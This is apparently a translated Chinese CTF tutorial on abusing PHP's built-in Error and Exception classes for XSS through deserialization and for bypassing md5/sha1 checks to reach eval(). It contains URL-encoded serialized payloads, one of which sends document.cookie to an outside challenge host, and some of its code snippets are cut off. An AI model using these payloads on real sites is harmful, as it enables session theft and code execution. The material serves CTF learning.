# PHP 原生类在 CTF 中的利用
##### 译文声明
本文是翻译文章
译文仅供参考，具体内容表达以及含义原文为准。
## 前言
在CTF题目中，好几次都遇到了利用 PHP 原生类进行XSS、反序列化、SSRF、XXE以及读文件的思路，遇到一个就卡住一个……一直想好好看一下 PHP
原生类在 CTF 中的利用，迫于生活xx拖了好久。今天终于有机会好好总结总结了。我们可以使用以下方法遍历一下PHP的内置类：
     ` 的写法，当 PHP 对象被当作一个字符串输出或使用时候（如`echo`的时候）会触发`__toString`
方法，这是一种挖洞的新思路。
下面演示如何使用 Error 内置类来构造 XSS。
测试代码：
（这里可以看到是一个反序列化函数，但是没有让我们进行反序列化的类啊，这就遇到了一个反序列化但没有POP链的情况，所以只能找到PHP内置类来进行反序列化）
给出POC：
    //输出: O%3A5%3A%22Error%22%3A7%3A%7Bs%3A10%3A%22%00%2A%00message%22%3Bs%3A25%3A%22%3Cscript%3Ealert%281%29%3C%2Fscript%3E%22%3Bs%3A13%3A%22%00Error%00string%22%3Bs%3A0%3A%22%22%3Bs%3A7%3A%22%00%2A%00code%22%3Bi%3A0%3Bs%3A7%3A%22%00%2A%00file%22%3Bs%3A18%3A%22%2Fusercode%2Ffile.php%22%3Bs%3A7%3A%22%00%2A%00line%22%3Bi%3A2%3Bs%3A12%3A%22%00Error%00trace%22%3Ba%3A0%3A%7B%7Ds%3A15%3A%22%00Error%00previous%22%3BN%3B%7D
成功弹窗。
###  Exception 内置类
  * 适用于php5、7版本
  * 开启报错的情况下
测试代码：
给出POC：
    //输出: O%3A9%3A%22Exception%22%3A7%3A%7Bs%3A10%3A%22%00%2A%00message%22%3Bs%3A25%3A%22%3Cscript%3Ealert%281%29%3C%2Fscript%3E%22%3Bs%3A17%3A%22%00Exception%00string%22%3Bs%3A0%3A%22%22%3Bs%3A7%3A%22%00%2A%00code%22%3Bi%3A0%3Bs%3A7%3A%22%00%2A%00file%22%3Bs%3A18%3A%22%2Fusercode%2Ffile.php%22%3Bs%3A7%3A%22%00%2A%00line%22%3Bi%3A2%3Bs%3A16%3A%22%00Exception%00trace%22%3Ba%3A0%3A%7B%7Ds%3A19%3A%22%00Exception%00previous%22%3BN%3B%7D
###  [BJDCTF 2nd]xss之光
进入题目，首先通过git泄露拿到源码：
得到payload如下：
    /?yds_is_so_beautiful=O%3A9%3A%22Exception%22%3A7%3A%7Bs%3A10%3A%22%00%2A%00message%22%3Bs%3A109%3A%22%3Cscript%3Ewindow.open%28%27http%3A%2F%2Fde28dfb3-f224-48d4-b579-f1ea61189930.node3.buuoj.cn%2F%3F%27%2Bdocument.cookie%29%3B%3C%2Fscript%3E%22%3Bs%3A17%3A%22%00Exception%00string%22%3Bs%3A0%3A%22%22%3Bs%3A7%3A%22%00%2A%00code%22%3Bi%3A0%3Bs%3A7%3A%22%00%2A%00file%22%3Bs%3A18%3A%22%2Fusercode%2Ffile.php%22%3Bs%3A7%3A%22%00%2A%00line%22%3Bi%3A2%3Bs%3A16%3A%22%00Exception%00trace%22%3Ba%3A0%3A%7B%7Ds%3A19%3A%22%00Exception%00previous%22%3BN%3B%7D
执行后，得到flag就在 cookie 中：
## 使用 Error/Exception 内置类绕过哈希比较
在上文中，我们已经认识了Error和Exception这两个PHP内置类，但对他们妙用不仅限于
XSS，还可以通过巧妙的构造绕过md5()函数和sha1()函数的比较。这里我们就要详细的说一下这个两个错误类了。
###  Error 类
**Error** 是所有PHP内部错误类的基类，该类是在PHP 7.0.0 中开始引入的。
**类摘要：**
    Error implements Throwable {
        /* 属性 */
        protected string $message ;
        protected int $code ;
        protected string $file ;
        protected int $line ;
        /* 方法 */
        public __construct ( string $message = "" , int $code = 0 , Throwable $previous = null )
        final public getMessage ( ) : string
        final public getPrevious ( ) : Throwable
        final public getCode ( ) : mixed
        final public getFile ( ) : string
        final public getLine ( ) : int
        final public getTrace ( ) : array
        final public getTraceAsString ( ) : string
        public __toString ( ) : string
        final private __clone ( ) : void
    }
**类属性：**
  * message：错误消息内容
  * code：错误代码
  * file：抛出错误的文件名
  * line：抛出错误在该文件中的行数
**类方法：**
  * [`Error::__construct`](https://www.php.net/manual/zh/error.construct.php) — 初始化 error 对象
  * [`Error::getMessage`](https://www.php.net/manual/zh/error.getmessage.php) — 获取错误信息
  * [`Error::getPrevious`](https://www.php.net/manual/zh/error.getprevious.php) — 返回先前的 Throwable
  * [`Error::getCode`](https://www.php.net/manual/zh/error.getcode.php) — 获取错误代码
  * [`Error::getFile`](https://www.php.net/manual/zh/error.getfile.php) — 获取错误发生时的文件
  * [`Error::getLine`](https://www.php.net/manual/zh/error.getline.php) — 获取错误发生时的行号
  * [`Error::getTrace`](https://www.php.net/manual/zh/error.gettrace.php) — 获取调用栈（stack trace）
  * [`Error::getTraceAsString`](https://www.php.net/manual/zh/error.gettraceasstring.php) — 获取字符串形式的调用栈（stack trace）
  * [`Error::__toString`](https://www.php.net/manual/zh/error.tostring.php) — error 的字符串表达
  * [`Error::__clone`](https://www.php.net/manual/zh/error.clone.php) — 克隆 error
###  Exception 类
**Exception** 是所有异常的基类，该类是在PHP 5.0.0 中开始引入的。
**类摘要：**
    Exception {
        /* 属性 */
        protected string $message ;
        protected int $code ;
        protected string $file ;
        protected int $line ;
        /* 方法 */
        public __construct ( string $message = "" , int $code = 0 , Throwable $previous = null )
        final public getMessage ( ) : string
        final public getPrevious ( ) : Throwable
        final public getCode ( ) : mixed
        final public getFile ( ) : string
        final public getLine ( ) : int
        final public getTrace ( ) : array
        final public getTraceAsString ( ) : string
        public __toString ( ) : string
        final private __clone ( ) : void
    }
**类属性：**
  * message：异常消息内容
  * code：异常代码
  * file：抛出异常的文件名
  * line：抛出异常在该文件中的行号
**类方法：**
  * [`Exception::__construct`](https://www.php.net/manual/zh/exception.construct.php) — 异常构造函数
  * [`Exception::getMessage`](https://www.php.net/manual/zh/exception.getmessage.php) — 获取异常消息内容
  * [`Exception::getPrevious`](https://www.php.net/manual/zh/exception.getprevious.php) — 返回异常链中的前一个异常
  * [`Exception::getCode`](https://www.php.net/manual/zh/exception.getcode.php) — 获取异常代码
  * [`Exception::getFile`](https://www.php.net/manual/zh/exception.getfile.php) — 创建异常时的程序文件名称
  * [`Exception::getLine`](https://www.php.net/manual/zh/exception.getline.php) — 获取创建的异常所在文件中的行号
  * [`Exception::getTrace`](https://www.php.net/manual/zh/exception.gettrace.php) — 获取异常追踪信息
  * [`Exception::getTraceAsString`](https://www.php.net/manual/zh/exception.gettraceasstring.php) — 获取字符串类型的异常追踪信息
  * [`Exception::__toString`](https://www.php.net/manual/zh/exception.tostring.php) — 将异常对象转换为字符串
  * [`Exception::__clone`](https://www.php.net/manual/zh/exception.clone.php) — 异常克隆
我们可以看到，在Error和Exception这两个PHP原生类中内只有 `__toString` 方法，这个方法用于将异常或错误对象转换为字符串。
我们以Error为例，我们看看当触发他的 `__toString` 方法时会发生什么：
    syc != $this->lover) && (md5($this->syc) === md5($this->lover)) && (sha1($this->syc)=== sha1($this->lover)) ){
               if(!preg_match("/\syc, $match)){
                   eval($this->syc);
               } else {
                   die("Try Hard !!");
               }
            }
        }
    }
    if (isset($_GET['great'])){
        unserialize($_GET['great']);
    } else {
        highlight_file(__FILE__);
    }
    ?>
可见，需要进入eval()执行代码需要先通过上面的if语句：
    if( ($this->syc != $this->lover) && (md5($this->syc) === md5($this->lover)) && (sha1($this->syc)=== sha1($this->lover)) )
这个乍看一眼在ctf的基础题目中非常常见，一般情况下只需要使用数组即可绕过。但是这里是在类里面，我们当然不能这么做。
这里的考点是md5()和sha1()可以对一个类进行hash，并且会触发这个类的 `__toString`
方法；且当eval()函数传入一个类对象时，也会触发这个类里的 `__toString` 方法。
所以我们可以使用含有 `__toString` 方法的PHP内置类来绕过，用的两个比较多的内置类就是 `Exception` 和 `Error`
，他们之中有一个 `__toString` 方法，当类被当做字符串处理时，就会调用这个函数。
根据刚才讲的Error类和Exception类中 `__toString` 方法的特性，我们可以用这两个内置类进行绕过。
由于题目用preg_match过滤了小括号无法调用函数，所以我们尝试直接 `include "/flag"`
将flag包含进来即可。由于过滤了引号，我们直接用url取反绕过即可。